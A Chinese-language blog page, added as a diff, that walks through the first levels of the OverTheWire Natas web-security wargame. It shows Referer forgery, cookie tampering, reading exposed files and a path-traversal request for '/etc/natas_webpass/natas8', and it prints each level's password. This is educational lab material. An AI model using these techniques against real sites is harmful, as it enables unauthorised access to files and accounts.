@@ -1,0 +1,1430 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="CTF,Linux," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="NATAS0-33Natas教授了服务器端网络安全的基础知识。natas的每个级别都包含位于http://natasX.natas.labs.overthewire.org的自己的网站 ，其中X是级别号码。有没有SSH登录。要访问某个级别，请输入该级别的用户名（例如，0级的natas0）及其密码。每个级别都可以访问下一级别的密码。你的工作是以某种方式获得下一个密码并升级。所有密码也存储在/ etc">
+<meta name="keywords" content="CTF,Linux">
+<meta property="og:type" content="article">
+<meta property="og:title" content="OverTheWire-Natas">
+<meta property="og:url" content="http://yoursite.com/2018/05/17/OverTheWire-Natas/index.html">
+<meta property="og:site_name" content="Crayon&#39;s blog">
+<meta property="og:description" content="NATAS0-33Natas教授了服务器端网络安全的基础知识。natas的每个级别都包含位于http://natasX.natas.labs.overthewire.org的自己的网站 ，其中X是级别号码。有没有SSH登录。要访问某个级别，请输入该级别的用户名（例如，0级的natas0）及其密码。每个级别都可以访问下一级别的密码。你的工作是以某种方式获得下一个密码并升级。所有密码也存储在/ etc">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2018-05-21T08:22:42.138Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="OverTheWire-Natas">
+<meta name="twitter:description" content="NATAS0-33Natas教授了服务器端网络安全的基础知识。natas的每个级别都包含位于http://natasX.natas.labs.overthewire.org的自己的网站 ，其中X是级别号码。有没有SSH登录。要访问某个级别，请输入该级别的用户名（例如，0级的natas0）及其密码。每个级别都可以访问下一级别的密码。你的工作是以某种方式获得下一个密码并升级。所有密码也存储在/ etc">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/05/17/OverTheWire-Natas/"/>
+
+
+
+
+
+  <title>OverTheWire-Natas | Crayon's blog</title>
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?253f54a0bb54d6f6605da5bad0e4f0fc";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Crayon's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description"></h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/17/OverTheWire-Natas/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Crayon-xin">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Crayon's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">OverTheWire-Natas</h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-17T08:40:50+08:00">
+                2018-05-17
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2018/05/17/OverTheWire-Natas/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count gitment-comments-count" data-xid="/2018/05/17/OverTheWire-Natas/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2018/05/17/OverTheWire-Natas/" class="leancloud_visitors" data-flag-title="OverTheWire-Natas">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="NATAS0-33"><a href="#NATAS0-33" class="headerlink" title="NATAS0-33"></a>NATAS0-33</h2><p>Natas教授了服务器端网络安全的基础知识。natas的每个级别都包含位于<a href="http://natasX.natas.labs.overthewire.org的自己的网站" target="_blank" rel="noopener">http://natasX.natas.labs.overthewire.org的自己的网站</a> ，其中X是级别号码。有没有SSH登录。要访问某个级别，请输入该级别的用户名（例如，0级的natas0）及其密码。<br>每个级别都可以访问下一级别的密码。你的工作是以某种方式获得下一个密码并升级。所有密码也存储在/ etc / natas_webpass /中。例如，natas5的密码存储在/ etc / natas_webpass / natas5文件中，并且只能由natas4和natas5读取。</p>
+<h2 id="Natas-Level-0"><a href="#Natas-Level-0" class="headerlink" title="Natas Level 0"></a>Natas Level 0</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Username: natas0</span><br><span class="line">Password: natas0</span><br><span class="line">URL:      http://natas0.natas.labs.overthewire.org</span><br></pre></td></tr></table></figure>
+<p>过程：</p>
+<p>进入题目后</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You can find the password for the next level on this page.</span><br></pre></td></tr></table></figure>
+<p>查看源码获得flag</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- This stuff in the header has nothing to do with the level --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">type</span>=<span class="string">"text/css"</span> <span class="attr">href</span>=<span class="string">"http://natas.labs.overthewire.org/css/level.css"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"http://natas.labs.overthewire.org/css/jquery-ui.css"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"http://natas.labs.overthewire.org/css/wechall.css"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://natas.labs.overthewire.org/js/jquery-1.9.1.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://natas.labs.overthewire.org/js/jquery-ui.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">http://natas.labs.overthewire.org/js/wechall-data.js</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://natas.labs.overthewire.org/js/wechall.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">var wechallinfo = &#123; "level": "natas0", "pass": "natas0" &#125;;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>natas0<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"content"</span>&gt;</span></span><br><span class="line">You can find the password for the next level on this page.</span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto</p>
+<h2 id="Natas-Level-0-→-Level-1"><a href="#Natas-Level-0-→-Level-1" class="headerlink" title="Natas Level 0 → Level 1"></a>Natas Level 0 → Level 1</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Username: natas1</span><br><span class="line">URL:   	http://natas1.natas.labs.overthewire.org</span><br><span class="line"></span><br><span class="line">密码：gtVrDuiDfck831PqWsLEZy5gyDz1clto</span><br></pre></td></tr></table></figure>
+<p>过程：</p>
+<p>进入题目后</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ou can find the password for the next level on this page, but rightclicking has been blocked!</span><br></pre></td></tr></table></figure>
+<p>提示密码就在这个页面，但是鼠标右键被禁用了，所以通过F12查看源码来获取密码</p>
+<p>The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi</p>
+<h2 id="Natas-Level-1-→-Level-2"><a href="#Natas-Level-1-→-Level-2" class="headerlink" title="Natas Level 1 → Level 2"></a>Natas Level 1 → Level 2</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Username: natas2</span><br><span class="line">URL: 	http://natas2.natas.labs.overthewire.org</span><br><span class="line"></span><br><span class="line">密码： ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi</span><br></pre></td></tr></table></figure>
+<p>过程：</p>
+<p>先看看页面源码</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- This stuff in the header has nothing to do with the level --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">type</span>=<span class="string">"text/css"</span> <span class="attr">href</span>=<span class="string">"http://natas.labs.overthewire.org/css/level.css"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"http://natas.labs.overthewire.org/css/jquery-ui.css"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"http://natas.labs.overthewire.org/css/wechall.css"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://natas.labs.overthewire.org/js/jquery-1.9.1.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://natas.labs.overthewire.org/js/jquery-ui.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">http://natas.labs.overthewire.org/js/wechall-data.js</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://natas.labs.overthewire.org/js/wechall.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">var wechallinfo = &#123; "level": "natas2", "pass": "ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi" &#125;;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>natas2<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"content"</span>&gt;</span></span><br><span class="line">There is nothing on this page</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"files/pixel.png"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>发现这样一个图片<code>files/pixel.png</code>，但是非常小，感觉没有什么用，那就直接访问<a href="http://natas2.natas.labs.overthewire.org/files/" target="_blank" rel="noopener">http://natas2.natas.labs.overthewire.org/files/</a> 发现除了<code>pixel.png</code>图片还有一个<code>users.txt</code>的文件</p>
+<p>获得文件内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># username:password</span><br><span class="line">alice:BYNdCesZqW</span><br><span class="line">bob:jw2ueICLvT</span><br><span class="line">charlie:G5vCxkVV3m</span><br><span class="line">natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14</span><br><span class="line">eve:zo4mJWyNj2</span><br><span class="line">mallory:9urtcpzBmH</span><br></pre></td></tr></table></figure>
+<p>natas3: sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14</p>
+<h2 id="Natas-Level-2-→-Level-3"><a href="#Natas-Level-2-→-Level-3" class="headerlink" title="Natas Level 2 → Level 3"></a>Natas Level 2 → Level 3</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Username: natas3</span><br><span class="line">URL:      http://natas3.natas.labs.overthewire.org</span><br><span class="line"></span><br><span class="line">密码：sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14</span><br></pre></td></tr></table></figure>
+<p>过程：</p>
+<p>进入题目后查看源码，发现没有什么可用信息，那就看一下robots文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /s3cr3t/</span><br></pre></td></tr></table></figure>
+<p>访问 <code>/s3cr3t/</code>，发现<code>users.txt</code>文件,接着访问<code>users.txt</code>获得下一关的密码</p>
+<p>natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ</p>
+<h2 id="Natas-Level-3-→-Level-4"><a href="#Natas-Level-3-→-Level-4" class="headerlink" title="Natas Level 3 → Level 4"></a>Natas Level 3 → Level 4</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Username: natas4</span><br><span class="line">URL:      http://natas4.natas.labs.overthewire.org</span><br><span class="line"></span><br><span class="line">密码：Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ</span><br></pre></td></tr></table></figure>
+<p>过程：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Access disallowed. You are visiting from &quot;&quot; while authorized users should come only from &quot;http://natas5.natas.labs.overthewire.org/&quot;</span><br></pre></td></tr></table></figure>
+<p>从<a href="http://natas5.natas.labs.overthewire.org/访问就可以获得密码，那就直接使用Burp" target="_blank" rel="noopener">http://natas5.natas.labs.overthewire.org/访问就可以获得密码，那就直接使用Burp</a> suite抓包，将请求头的Referer改为题目指定的</p>
+<p>Http协议中的referer表示的就是你从哪个页面来的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: http://natas5.natas.labs.overthewire.org/</span><br></pre></td></tr></table></figure>
+<p>The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq</p>
+<h2 id="Natas-Level-4-→-Level-5"><a href="#Natas-Level-4-→-Level-5" class="headerlink" title="Natas Level 4 → Level 5"></a>Natas Level 4 → Level 5</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Username: natas5</span><br><span class="line">URL:      http://natas5.natas.labs.overthewire.org</span><br><span class="line"></span><br><span class="line">密码：iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq</span><br></pre></td></tr></table></figure>
+<p>过程：</p>
+<p>进入题目后提示还没有登陆</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Access disallowed. You are not logged in</span><br></pre></td></tr></table></figure>
+<p>用Burp suite获取请求包</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: natas5.natas.labs.overthewire.org</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Cookie: loggedin=0</span><br><span class="line">Authorization: Basic bmF0YXM1OmlYNklPZm1wTjdBWU9RR1B3dG4zZlhwYmFKVkpjSGZx</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br></pre></td></tr></table></figure>
+<p>发现<code>Cookie: loggedin=0</code>，猜测0为没有登陆，1为已经登陆，所以将0改为1，重放后获得密码</p>
+<p>The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1 </p>
+<h2 id="Natas-Level-5-→-Level-6"><a href="#Natas-Level-5-→-Level-6" class="headerlink" title="Natas Level 5 → Level 6"></a>Natas Level 5 → Level 6</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Username: natas6</span><br><span class="line">URL:      http://natas6.natas.labs.overthewire.org</span><br><span class="line"></span><br><span class="line">密码：aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1</span><br></pre></td></tr></table></figure>
+<p>过程：</p>
+<p>进入题目后有一个提交框，我们还是先看看源码，点击<code>View sourcecode</code></p>
+<p>发现PHP脚本</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"includes/secret.inc"</span>;</span><br><span class="line">    <span class="keyword">if</span>(array_key_exists(<span class="string">"submit"</span>, $_POST)) &#123;</span><br><span class="line">        <span class="keyword">if</span>($secret == $_POST[<span class="string">'secret'</span>]) &#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Access granted. The password for natas7 is &lt;censored&gt;"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Wrong secret"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>我们输入的参数和预先设定的<code>$secret</code>一样就可以获得密码，那直接访问<code>secret.inc</code>文件试试看</p>
+<p>访问<a href="http://natas6.natas.labs.overthewire.org/includes/secret.inc，虽然页面空白，但是鼠标右键查看源码~哇" target="_blank" rel="noopener">http://natas6.natas.labs.overthewire.org/includes/secret.inc，虽然页面空白，但是鼠标右键查看源码~哇</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">$secret = <span class="string">"FOEIUWGHFEEUHOFUOIU"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>现在回来直接在提交框提交<code>FOEIUWGHFEEUHOFUOIU</code>获得密码</p>
+<p>The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9</p>
+<h2 id="Natas-Level-6-→-Level-7"><a href="#Natas-Level-6-→-Level-7" class="headerlink" title="Natas Level 6 → Level 7"></a>Natas Level 6 → Level 7</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Username: natas7</span><br><span class="line">URL:      http://natas7.natas.labs.overthewire.org</span><br><span class="line"></span><br><span class="line">密码：7z3hEENjQtflzgnT29q7wAvMNfZdh0i9</span><br></pre></td></tr></table></figure>
+<p>过程：</p>
+<p>发现两个超链接，但是并没有什么用，查看网页源码获得提示</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 --&gt;</span><br></pre></td></tr></table></figure>
+<p>猜测是文件包含</p>
+<p>直接访问：<code>http://natas7.natas.labs.overthewire.org/index.php?page=../../../../../etc/natas_webpass/natas8</code>获得密码</p>
+<p>DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe</p>
+<h2 id="Natas-Level-7-→-Level-8"><a href="#Natas-Level-7-→-Level-8" class="headerlink" title="Natas Level 7 → Level 8"></a>Natas Level 7 → Level 8</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Username: natas8</span><br><span class="line">URL:      http://natas8.natas.labs.overthewire.org</span><br><span class="line"></span><br><span class="line">密码： DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe</span><br></pre></td></tr></table></figure>
+<p>过程：</p>
+<p>还是点击<code>View sourcecode</code>看看源码吧</p>
